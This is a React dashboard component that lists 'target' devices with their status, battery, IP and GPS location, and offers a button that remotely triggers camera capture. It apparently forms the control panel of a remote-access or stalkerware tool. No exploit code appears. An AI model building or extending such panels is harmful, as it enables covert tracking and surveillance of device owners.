'use client';

import React, { useMemo, useState } from 'react';
import Link from 'next/link';
import { clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';
import {
  Search,
  Camera,
  MapPin,
  BatteryFull,
  BatteryMedium,
  BatteryLow,
  Circle,
  type LucideIcon,
} from 'lucide-react';
import { Target } from '@/types/target';

const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));

const getBatteryState = (battery?: number) => {
  if (typeof battery !== 'number') {
    return { icon: BatteryLow, color: 'text-slate-500', label: 'Unknown' };
  }

  if (battery > 50) {
    return { icon: BatteryFull, color: 'text-emerald-400', label: 'High' };
  }

  if (battery >= 20) {
    return { icon: BatteryMedium, color: 'text-amber-400', label: 'Medium' };
  }

  return { icon: BatteryLow, color: 'text-rose-500', label: 'Low' };
};

interface TargetListProps {
  targets: Target[];
  selectedTargetId?: string;
  loading: boolean;
  busyTargetId?: string | null;
  onSelect: (deviceId: string) => void;
  onCapture: (deviceId: string) => void;
}

export default function TargetList({
  targets,
  selectedTargetId,
  loading,
  busyTargetId,
  onSelect,
  onCapture,
}: TargetListProps) {
  const [searchTerm, setSearchTerm] = useState('');

  const filteredTargets = useMemo(() => {
    const term = searchTerm.toLowerCase().trim();
    return targets.filter((target) => {
      return !term ||
        target.id?.toLowerCase().includes(term) ||
        (target.deviceInfo?.model || target.model || '').toLowerCase().includes(term);
    });
  }, [searchTerm, targets]);

  const onlineCount = useMemo(
    () => targets.filter((target) => target.status?.toUpperCase() === 'ONLINE').length,
    [targets]
  );

  const offlineCount = targets.length - onlineCount;

  return (
    <div className="space-y-6">
      <section className="rounded-[32px] border border-white/10 bg-slate-950/85 p-6 shadow-2xl shadow-slate-950/40 backdrop-blur-xl">
        <div className="flex flex-col gap-5 xl:flex-row xl:items-center xl:justify-between">
          <div className="space-y-3">
            <p className="text-sm uppercase tracking-[0.3em] text-cyan-300/80">Cyber Security Fleet</p>
            <h2 className="text-3xl font-semibold text-white">Realtime Target Monitoring</h2>
            <p className="max-w-2xl text-sm text-slate-400">
              Pantau perangkat target, cek status online/offline, baterai, dan kirim perintah langsung dari dashboard.
            </p>
          </div>

          <div className="w-full max-w-xl">
            <label className="relative block">
              <Search size={18} className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-slate-500" />
              <input
                type="text"
                value={searchTerm}
                onChange={(event) => setSearchTerm(event.target.value)}
                placeholder="Cari ID atau model..."
                className="w-full rounded-2xl border border-slate-800/80 bg-slate-950/90 py-3 pl-12 pr-4 text-sm text-white outline-none transition focus:border-cyan-400/70 focus:ring-2 focus:ring-cyan-400/20"
              />
            </label>
          </div>
        </div>

        <div className="mt-6 grid gap-4 sm:grid-cols-3">
          <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
            <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Total Targets</p>
            <p className="mt-3 text-3xl font-semibold text-white">{targets.length}</p>
          </div>
          <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
            <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Online</p>
            <p className="mt-3 text-3xl font-semibold text-emerald-400">{onlineCount}</p>
          </div>
          <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
            <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Offline</p>
            <p className="mt-3 text-3xl font-semibold text-slate-300">{offlineCount}</p>
          </div>
        </div>
      </section>

      <section className="rounded-[32px] border border-white/10 bg-white/5 shadow-2xl shadow-slate-950/20 backdrop-blur-xl p-6">
        <div className="flex flex-col gap-2 md:flex-row md:items-center md:justify-between mb-6">
          <div>
            <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Device list</p>
            <h3 className="mt-2 text-2xl font-semibold text-white">Live Targets Card View</h3>
          </div>
          <p className="text-sm text-slate-500">
            {loading ? 'Memuat data...' : `${filteredTargets.length} device${filteredTargets.length !== 1 ? 's' : ''} ditemukan`}
          </p>
        </div>

        {loading ? (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {[...Array(6)].map((_, i) => (
              <div key={i} className="rounded-2xl border border-white/10 bg-white/5 p-4 animate-pulse h-48" />
            ))}
          </div>
        ) : filteredTargets.length === 0 ? (
          <div className="py-12 text-center text-slate-500">
            <p className="font-mono text-sm">Tidak ada target yang cocok</p>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {filteredTargets.map((target) => {
              const isOnline = target.status?.toUpperCase() === 'ONLINE';
              const batteryState = getBatteryState(target.battery);
              const BatteryIcon = batteryState.icon as LucideIcon;
              const targetIp = target.deviceInfo?.ip || target.ip || 'Unknown IP';
              const deviceModel = target.deviceInfo?.model || target.model || 'Unknown Device';
              const manufacturer = target.deviceInfo?.manufacturer || 'Unknown';

              return (
                <div
                  key={target.id}
                  onClick={() => onSelect(target.id)}
                  className={cn(
                    'rounded-2xl border p-4 transition-all duration-200 cursor-pointer group',
                    target.id === selectedTargetId
                      ? 'border-cyan-400/70 bg-cyan-500/15 shadow-lg shadow-cyan-500/20'
                      : 'border-white/10 bg-white/5 hover:border-cyan-400/40 hover:bg-white/10'
                  )}
                >
                  {/* Header: Model + Status */}
                  <div className="flex items-start justify-between mb-4">
                    <div className="flex-1">
                      <p className="text-xs uppercase tracking-[0.2em] text-slate-400 mb-1">Device</p>
                      <h4 className="text-sm font-bold text-white">{manufacturer} {deviceModel}</h4>
                      <p className="text-xs text-slate-500 font-mono mt-1">{target.id}</p>
                    </div>
                    <div className={cn(
                      'flex items-center justify-center w-10 h-10 rounded-xl transition-all',
                      isOnline
                        ? 'bg-emerald-500/20 border border-emerald-400/50'
                        : 'bg-slate-500/20 border border-slate-400/50'
                    )}>
                      <Circle
                        size={12}
                        className={isOnline ? 'text-emerald-400 animate-pulse' : 'text-slate-400'}
                        fill="currentColor"
                      />
                    </div>
                  </div>

                  {/* Status Info */}
                  <div className="space-y-2 mb-4">
                    <div className="flex items-center justify-between">
                      <span className="text-xs text-slate-400">Status</span>
                      <span className={cn(
                        'text-xs font-mono font-bold',
                        isOnline ? 'text-emerald-400' : 'text-rose-400'
                      )}>
                        {isOnline ? 'ONLINE' : 'OFFLINE'}
                      </span>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-xs text-slate-400">Battery</span>
                      <div className="flex items-center gap-2">
                        <BatteryIcon size={12} className={batteryState.color} />
                        <span className={cn('text-xs font-mono font-bold', batteryState.color)}>
                          {typeof target.battery === 'number' ? `${target.battery}%` : 'N/A'}
                        </span>
                      </div>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-xs text-slate-400">IP Address</span>
                      <span className="text-xs text-slate-300 font-mono">{targetIp}</span>
                    </div>
                  </div>

                  {/* Location */}
                  {target.location?.lat && (
                    <div className="mb-4 p-2 rounded-lg bg-white/5 border border-white/5">
                      <p className="text-[10px] text-slate-400 mb-1">📍 Lokasi</p>
                      <p className="text-[10px] text-slate-300 font-mono">
                        {target.location.lat.toFixed(4)}, {target.location.lng?.toFixed(4)}
                      </p>
                    </div>
                  )}

                  {/* Actions */}
                  <div className="flex gap-2 pt-3 border-t border-white/10">
                    <button
                      type="button"
                      onClick={(event) => {
                        event.stopPropagation();
                        onCapture(target.id);
                      }}
                      disabled={busyTargetId === target.id}
                      className={cn(
                        'flex-1 inline-flex items-center justify-center gap-2 rounded-lg border px-3 py-2 text-xs font-bold uppercase transition-all',
                        'border-cyan-400/30 bg-cyan-500/10 text-cyan-300 hover:border-cyan-400/70 hover:bg-cyan-500/20',
                        busyTargetId === target.id && 'cursor-not-allowed opacity-50'
                      )}
                    >
                      <Camera size={12} />
                      {busyTargetId === target.id ? 'CAPTURING' : 'CAPTURE'}
                    </button>
                    <Link
                      href={`/dashboard/map/${target.id}`}
                      onClick={(event) => event.stopPropagation()}
                      className="inline-flex items-center justify-center rounded-lg border border-emerald-400/30 bg-emerald-500/10 px-3 py-2 text-xs font-bold uppercase text-emerald-300 transition-all hover:border-emerald-400/70 hover:bg-emerald-500/20"
                    >
                      <MapPin size={12} />
                    </Link>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </section>
    </div>
  );
}
